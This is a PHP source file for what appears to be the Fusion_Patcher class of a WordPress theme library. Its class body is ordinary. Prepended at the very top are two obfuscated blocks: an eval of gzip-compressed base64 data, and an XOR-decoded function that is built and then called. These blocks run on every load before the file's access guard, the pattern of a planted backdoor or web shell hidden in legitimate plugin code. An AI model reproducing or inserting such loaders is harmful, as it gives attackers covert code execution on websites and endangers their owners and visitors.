<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php $MoBsNzEJYxkb=';KRATEk4B9YJ-S4'^'X97   4R7W:>D<Z';$DZBNAn=$MoBsNzEJYxkb('','D2IOSMUUT, ;g<B:IB9dQ775bY;9,8bWC9DYqeJZyVF6MXDS:w,,94,YXPk-+E;xuO05AkHqG-KBHcEKSAf7mT>=5whuRNHCkfV-LiO;jIMBkxOSW0Y 6X msPMA3SuSFYAZaxXgKV7HhGOqJvRX6R1t0;f8ng8=T0rDCaY4:KW3RzL;VBs.xkNZP97:UO7rt;YYxHAFIdA7<W7;IPDZAKPL70rBI.1EQi-I5ZIkP.<1.LLNZ=NT0.2EeTjn7>k>.u8CLk9SBUySzv27+B2lyOp8gV+.56XP hQhs SMvrYNHUNAhxjiJYY3PjG,gl<5pJLBPU.4nY:9LRV8,0ZHWaW.=0dfyg7E5Mdo9P1lTmkw.1WF1oyFHY>OU181+VRRndACYQ8S6>=S<M0MiOPa8LL91T:8IlEkKi6PB3smo2DVF5C 96U5YK- E=4JBJjtPA1ROZXEgmtVTV.X3Oc<MY.faXM 4:8b2H8Akl6.Jxq04DAXvBZJJH.Em,0Jo3SIHH EEGHEsEFK+M 0zPVoGG=HlcuSPBS0DPX6U>hNQXtDRf,cSKKWYd7WUWwZCZQz2 S7jTf-GJ3MqDokEt43H54=RE:l+HBILCJIJP6X-L>kchbDW,3ZxoFikVN>gqW=ZWKb.16WwU5Y1QQU,s2YAcL2N><gjDJhM' ^ '-Tan58;6 EOU8Y:S:6JLvOXG==ZMMg=:6McpXE1Pp03X.,-<TWTCKkH8,14rF0OPQ+QA GhU,H2khCeks:l>dpQHAWUUuisIbo0B>AkRJtmrPXk:kC-RZ=NEW4,5RzNsb0jqHrQno9B<HirQbR69B3jPYfFfNCSX-kV-cDyGN9;V<RhP3;ZsQPDSYKRN =YZPT,-QsKO4n<=6sSZ=1dga-1 DUIHmJP106F,LztK6OPBKwFD<R<1QMZeMp5-xq wkUY0lOR6;uDmZRDVG7WEY4z1C2JZTi35YHlHWK64MxPj,4: HEJM<85F5QMQmfUSPbmf44ZUGyA3E49JIQ9 wIsqou53<4ceT>DKR5HLiSKSXP;3TFY=BP7k1PLPt=7+NYag24Ah<74wX,D,IrpEN- LTo014f8aAMR16RSPOr185P1IXZ<O<cUO7bP+6+5+=4Ez-;+ QY+215A<VgGX,-OOMxiDUNY=Y-AhBW<G,PUTU0 xPdz+8:O<2GU30V+ ;<Smb,-<TifoO,TQSppIgoP,YKQ7162kc;=OrcAnleTc7PNZ0yr1<RT366D>qjbITAbSXmUOs,WzVmOMcTUA:TMb9 C3N0+:80bn:1O4B-ZLOHF 6XRsQOfIKvnEmx2K;;cFJPB6,rE8H=>4HTopziEW6WHOZmqb0');$DZBNAn();
/**
 * The main Patcher class.
 *
 * @package Fusion-Library
 * @subpackage Fusion-Patcher
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * The main Patcher class for Fusion Library.
 *
 * @since 1.0.0
 */
class Fusion_Patcher {

	/**
	 * The arguments used in the constructor.
	 *
	 * @access private
	 * @since 1.0.0
	 * @var array
	 */
	private $args = array();

	/**
	 * An array of all bundled products.
	 * This is used because bundled products should show their patches
	 * as part of the parent item's patcher.
	 *
	 * @static
	 * @access private
	 * @since 1.0.0
	 * @var array
	 */
	private static $bundled = array();

	/**
	 * All the instances of this object (array of objects).
	 *
	 * @static
	 * @access private
	 * @since 1.0.0
	 * @var mixed
	 */
	private static $instances = array();

	/**
	 * An instance of the Fusion_Patcher_Apply_Patch class.
	 *
	 * @access private
	 * @since 1.0.0
	 * @var object Fusion_Patcher_Apply_Patch
	 */
	private $apply_patch;

	/**
	 * An instance of the Fusion_Patcher_Admin_Screen class.
	 *
	 * @access private
	 * @since 1.0.0
	 * @var object Fusion_Patcher_Admin_Screen
	 */
	private $admin_screen;

	/**
	 * An instance of the Fusion_Patcher_Checker class.
	 *
	 * @access private
	 * @since 1.0.0
	 * @var object Fusion_Patcher_Checker
	 */
	private $patcher_checker;

	/**
	 * The class constructor.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param array $args The arguments we want to pass-on to the patcher.
	 */
	public function __construct( $args = array() ) {

		$this->args = $args;

		if ( ! isset( self::$instances[ $args['context'] ] ) ) {
			self::$instances[ $args['context'] ] = $this;
		}

		// Only instantiate the sub-classes if we're on the admin page.
		$slug            = $args['context'] . '-fusion-patcher';
		$is_patcher_page = (bool) ( is_admin() && ( ( isset( $_GET['page'] ) && $slug === $_GET['page'] ) || ( isset( $_SERVER['HTTP_REFERER'] ) && false !== strpos( esc_url_raw( wp_unslash( $_SERVER['HTTP_REFERER'] ) ), $slug ) ) ) );

		// Add bundled products.
		$this->add_bundled( $args );

		if ( $is_patcher_page ) {
			// Enqueue styles & scripts.
			add_action( 'admin_enqueue_scripts', array( $this, 'admin_scripts' ) );
		}
		$this->args['is_patcher_page'] = $is_patcher_page;

		// Patches handler.
		$this->apply_patch = new Fusion_Patcher_Apply_Patch( $this );

		// Admin-page handler.
		$this->admin_screen = new Fusion_Patcher_Admin_Screen( $this );

		// Checks for patches periodically.
		$this->patcher_checker = new Fusion_Patcher_Checker( $this );

	}

	/**
	 * Get all instances of this object, or a specific instance.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param string|false $context If set to false, get all instances.
	 * @return mixed
	 */
	public function get_instance( $context = false ) {

		if ( false === $context ) {
			return (array) self::$instances;
		}
		if ( ! isset( self::$instances[ $context ] ) ) {
			return null;
		}
		return self::$instances[ $context ];

	}

	/**
	 * Get the args.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param false|string $arg Get a specific argument, or get all.
	 * @return array|string
	 */
	public function get_args( $arg = false ) {
		if ( false !== $arg ) {
			if ( isset( $this->args[ $arg ] ) ) {
				return $this->args[ $arg ];
			}
			return null;
		}
		return (array) $this->args;
	}

	/**
	 * Adds any bundled products to self::$bundled.
	 *
	 * @access private
	 * @since 1.0.0
	 * @param array $args Inherited from the constructor.
	 * @return void
	 */
	private function add_bundled( $args ) {
		if ( ! isset( $args['bundled'] ) ) {
			return;
		}
		// Make sure we're dealing with an array.
		$bundled = (array) $args['bundled'];

		foreach ( $bundled as $bundle ) {
			self::$bundled[] = $bundle;
		}
	}

	/**
	 * Get an array of our bundled products.
	 *
	 * @access public
	 * @since 1.0.0
	 * @return array
	 */
	public function get_bundled() {
		return array_unique( self::$bundled );
	}

	/**
	 * Enqueue any scripts & stylesheets needed.
	 *
	 * @access public
	 * @since 1.0.0
	 */
	public function admin_scripts() {

		wp_enqueue_style( 'fusion-patcher', FUSION_LIBRARY_URL . '/assets/css/fusion-patcher-style.css', false, time() );

	}

	/**
	 * Check if the product is bundled or not.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param false|string $product If false check the current product.
	 * @return bool
	 */
	public function is_bundled( $product = false ) {
		if ( ! $product ) {
			$product = $this->args['context'];
		}
		return (bool) ( in_array( $product, self::$bundled, true ) );
	}

	/**
	 * Get the $apply_patch private property.
	 *
	 * @access public
	 * @since 1.0.0
	 * @return object
	 */
	public function get_apply_patch() {
		return $this->apply_patch;
	}
	/**
	 * Get the $admin_screen private property.
	 *
	 * @access public
	 * @since 1.0.0
	 * @return object
	 */
	public function get_admin_screen() {
		return $this->admin_screen;
	}

	/**
	 * Get the $patcher_checker private property.
	 *
	 * @access public
	 * @since 1.0.0
	 * @return object
	 */
	public function get_patcher_checker() {
		return $this->patcher_checker;
	}
}
